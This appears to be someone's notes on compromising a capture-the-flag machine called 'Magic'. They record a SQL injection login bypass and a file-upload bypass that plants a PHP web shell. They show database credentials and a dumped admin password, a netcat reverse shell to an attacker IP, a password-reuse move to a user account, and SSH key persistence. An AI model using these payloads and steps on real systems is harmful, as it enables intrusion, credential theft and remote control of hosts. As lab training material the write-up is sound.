# SQLi
In the username field /login.php I found that it is susceptible to SQLi I used the following payload
```SQL
admin' OR '1'='1
```
![[Pasted image 20240427134230.png]]

# File Upload
The upload functionality is vulnerable to a file upload attack. Below is the request in burp with the modified payload. The website seemed to check the first line of the image metadata
![[Pasted image 20240427144155.png]]
![[Pasted image 20240427144212.png]]

I then used the phpbash.php shell to get a nice-ish shell: https://github.com/Arrexel/phpbash/blob/master/phpbash.php
![[Pasted image 20240427144749.png]]

# db.php5
Found an interesting file 
```php
class Database
{
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

What is interesting is that the username was also found in the /etc/passwd file:
```shell
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
```
Going to check out if the ssh password is the same.  Would not let me login going to need public key

# Mysqldump

Nothing worked with those creds and I could not connect to mysql on the webshell but the mysqldump binary is there let us try that.
```shell
mysqldump -u theseus -piamkingtheseus --databases Magic
```

```
-- MySQL dump 10.13 Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost Database: Magic
-- ------------------------------------------------------
-- Server version 5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `Magic`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `Magic`;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
`id` int(6) NOT NULL AUTO_INCREMENT,
`username` varchar(50) NOT NULL,
`password` varchar(100) NOT NULL,
PRIMARY KEY (`id`),
UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
```

# Reverse Shell
Since I cannot ssh in as theseus I am going to try ```su theseus``` but I need an actual terminal so I uploaded the nc binary and executed the rev shell payload 
```
nc 10.10.14.12 8001 -e /bin/bash
```
and got a shell on my attack host
![[Pasted image 20240427154916.png]]
## Stabilizing the shell
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm


```

# Theseus
I was able to upgrade to the Theseus user by using the password from the database dump
```shell
www-data@magic:/var/www/Magic/images/uploads$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@magic:/var/www/Magic/images/uploads$ 

```
## Generating ssh persistence
```shell
ssh-keygen -t rsa
```

# Root access
I just ran the pwnkit exploit
